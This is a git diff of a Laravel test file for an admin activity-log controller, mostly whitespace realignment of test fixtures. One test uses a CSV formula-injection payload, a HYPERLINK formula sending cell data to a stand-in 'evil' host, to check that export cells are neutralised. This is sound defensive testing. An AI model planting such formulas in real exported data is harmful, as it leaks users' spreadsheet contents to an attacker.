@@ -7,6 +7,7 @@ use App\Models\RequestLog;
 use App\Models\User;
 use Illuminate\Foundation\Testing\RefreshDatabase;
 use Illuminate\Support\Carbon;
+use Inertia\Testing\AssertableInertia;
 use Spatie\Permission\Models\Role;
 use Tests\TestCase;
 
@@ -39,14 +40,14 @@ class ActivityLogControllerTest extends TestCase
     public function test_index_shows_audit_logs(): void
     {
         AuditLog::create([
-            'user_id' => $this->admin->id,
-            'entity_type' => 'App\\Models\\WorkOrder',
-            'entity_id' => 42,
-            'action' => 'created',
+            'user_id'      => $this->admin->id,
+            'entity_type'  => 'App\\Models\\WorkOrder',
+            'entity_id'    => 42,
+            'action'       => 'created',
             'before_state' => null,
-            'after_state' => ['status' => 'PENDING'],
-            'ip_address' => '10.0.0.1',
-            'user_agent' => 'phpunit',
+            'after_state'  => ['status' => 'PENDING'],
+            'ip_address'   => '10.0.0.1',
+            'user_agent'   => 'phpunit',
         ]);
 
         $response = $this->actingAs($this->admin)->get(route('admin.logs.activity'));
@@ -65,15 +66,15 @@ class ActivityLogControllerTest extends TestCase
     public function test_index_shows_request_logs(): void
     {
         RequestLog::create([
-            'user_id' => $this->admin->id,
-            'method' => 'GET',
-            'path' => '/admin/dashboard',
-            'route_name' => 'admin.dashboard',
-            'status' => 200,
+            'user_id'     => $this->admin->id,
+            'method'      => 'GET',
+            'path'        => '/admin/dashboard',
+            'route_name'  => 'admin.dashboard',
+            'status'      => 200,
             'duration_ms' => 17,
-            'ip_address' => '10.0.0.2',
-            'user_agent' => 'phpunit',
-            'sampled' => true,
+            'ip_address'  => '10.0.0.2',
+            'user_agent'  => 'phpunit',
+            'sampled'     => true,
         ]);
 
         $response = $this->actingAs($this->admin)->get(route('admin.logs.activity'));
@@ -94,21 +95,21 @@ class ActivityLogControllerTest extends TestCase
         $other->assignRole('Admin');
 
         AuditLog::create([
-            'user_id' => $this->admin->id,
+            'user_id'     => $this->admin->id,
             'entity_type' => 'App\\Models\\WorkOrder',
-            'entity_id' => 1,
-            'action' => 'created',
+            'entity_id'   => 1,
+            'action'      => 'created',
             'after_state' => ['x' => 1],
-            'ip_address' => '10.0.0.1',
+            'ip_address'  => '10.0.0.1',
         ]);
         AuditLog::create([
-            'user_id' => $other->id,
+            'user_id'     => $other->id,
             'entity_type' => 'App\\Models\\Line',
-            'entity_id' => 7,
-            'action' => 'updated',
-            'before_state' => ['name' => 'old'],
+            'entity_id'   => 7,
+            'action'      => 'updated',
+            'before_state'=> ['name' => 'old'],
             'after_state' => ['name' => 'new'],
-            'ip_address' => '10.0.0.99',
+            'ip_address'  => '10.0.0.99',
         ]);
 
         $response = $this->actingAs($this->admin)
@@ -134,12 +135,12 @@ class ActivityLogControllerTest extends TestCase
     {
         // Old row outside window
         $old = AuditLog::create([
-            'user_id' => $this->admin->id,
+            'user_id'     => $this->admin->id,
             'entity_type' => 'App\\Models\\WorkOrder',
-            'entity_id' => 555,
-            'action' => 'created',
+            'entity_id'   => 555,
+            'action'      => 'created',
             'after_state' => ['x' => 1],
-            'ip_address' => '10.0.0.1',
+            'ip_address'  => '10.0.0.1',
         ]);
         // force created_at backwards (cannot update via Eloquent due to immutability hook)
         \DB::table('audit_logs')->where('id', $old->id)->update([
@@ -148,17 +149,17 @@ class ActivityLogControllerTest extends TestCase
 
         // Recent row in window
         AuditLog::create([
-            'user_id' => $this->admin->id,
+            'user_id'     => $this->admin->id,
             'entity_type' => 'App\\Models\\Line',
-            'entity_id' => 999,
-            'action' => 'updated',
+            'entity_id'   => 999,
+            'action'      => 'updated',
             'after_state' => ['name' => 'new'],
-            'ip_address' => '10.0.0.1',
+            'ip_address'  => '10.0.0.1',
         ]);
 
         $response = $this->actingAs($this->admin)->get(route('admin.logs.activity', [
             'from' => Carbon::now()->subDays(2)->format('Y-m-d'),
-            'to' => Carbon::now()->format('Y-m-d'),
+            'to'   => Carbon::now()->format('Y-m-d'),
         ]));
 
         $response->assertStatus(200);
@@ -175,24 +176,24 @@ class ActivityLogControllerTest extends TestCase
     public function test_index_filters_by_source_audit(): void
     {
         AuditLog::create([
-            'user_id' => $this->admin->id,
+            'user_id'     => $this->admin->id,
             'entity_type' => 'App\\Models\\WorkOrder',
-            'entity_id' => 11,
-            'action' => 'created',
+            'entity_id'   => 11,
+            'action'      => 'created',
             'after_state' => ['x' => 1],
-            'ip_address' => '10.0.0.1',
+            'ip_address'  => '10.0.0.1',
         ]);
 
         RequestLog::create([
-            'user_id' => $this->admin->id,
-            'method' => 'GET',
-            'path' => '/admin/secret-nav',
-            'route_name' => null,
-            'status' => 200,
+            'user_id'     => $this->admin->id,
+            'method'      => 'GET',
+            'path'        => '/admin/secret-nav',
+            'route_name'  => null,
+            'status'      => 200,
             'duration_ms' => 5,
-            'ip_address' => '10.0.0.1',
-            'user_agent' => 'phpunit',
-            'sampled' => true,
+            'ip_address'  => '10.0.0.1',
+            'user_agent'  => 'phpunit',
+            'sampled'     => true,
         ]);
 
         $response = $this->actingAs($this->admin)
@@ -206,23 +207,23 @@ class ActivityLogControllerTest extends TestCase
     public function test_export_returns_csv(): void
     {
         AuditLog::create([
-            'user_id' => $this->admin->id,
+            'user_id'     => $this->admin->id,
             'entity_type' => 'App\\Models\\WorkOrder',
-            'entity_id' => 7,
-            'action' => 'created',
+            'entity_id'   => 7,
+            'action'      => 'created',
             'after_state' => ['x' => 1],
-            'ip_address' => '10.0.0.1',
+            'ip_address'  => '10.0.0.1',
         ]);
         RequestLog::create([
-            'user_id' => $this->admin->id,
-            'method' => 'GET',
-            'path' => '/admin/dashboard',
-            'route_name' => 'admin.dashboard',
-            'status' => 200,
+            'user_id'     => $this->admin->id,
+            'method'      => 'GET',
+            'path'        => '/admin/dashboard',
+            'route_name'  => 'admin.dashboard',
+            'status'      => 200,
             'duration_ms' => 9,
-            'ip_address' => '10.0.0.2',
-            'user_agent' => 'phpunit',
-            'sampled' => true,
+            'ip_address'  => '10.0.0.2',
+            'user_agent'  => 'phpunit',
+            'sampled'     => true,
         ]);
 
         $response = $this->actingAs($this->admin)->get(route('admin.logs.activity.export'));
@@ -249,12 +250,12 @@ class ActivityLogControllerTest extends TestCase
         $attacker = User::factory()->create(['name' => '=HYPERLINK("https://evil/?c="&A1, "x")']);
 
         AuditLog::create([
-            'user_id' => $attacker->id,
+            'user_id'     => $attacker->id,
             'entity_type' => 'App\\Models\\User',
-            'entity_id' => $attacker->id,
-            'action' => 'login',
+            'entity_id'   => $attacker->id,
+            'action'      => 'login',
             'after_state' => ['x' => 1],
-            'ip_address' => '10.0.0.1',
+            'ip_address'  => '10.0.0.1',
         ]);
 
         $response = $this->actingAs($this->admin)->get(route('admin.logs.activity.export'));
@@ -264,20 +265,20 @@ class ActivityLogControllerTest extends TestCase
 
         // The dangerous payload must NOT appear at the start of a cell.
         // After our fix it should be prefixed with a single quote.
-        $this->assertStringNotContainsString(',=HYPERLINK', $csv);
+        $this->assertStringNotContainsString(",=HYPERLINK", $csv);
         $this->assertStringContainsString("'=HYPERLINK", $csv); // neutralized form
     }
 
     public function test_index_handles_login_failed_with_null_user(): void
     {
         AuditLog::create([
-            'user_id' => null,
+            'user_id'     => null,
             'entity_type' => 'App\\Models\\User',
-            'entity_id' => null,
-            'action' => 'login_failed',
+            'entity_id'   => null,
+            'action'      => 'login_failed',
             'after_state' => ['username' => 'attacker'],
-            'ip_address' => '203.0.113.7',
-            'user_agent' => 'curl',
+            'ip_address'  => '203.0.113.7',
+            'user_agent'  => 'curl',
         ]);
 
         $response = $this->actingAs($this->admin)->get(route('admin.logs.activity'));
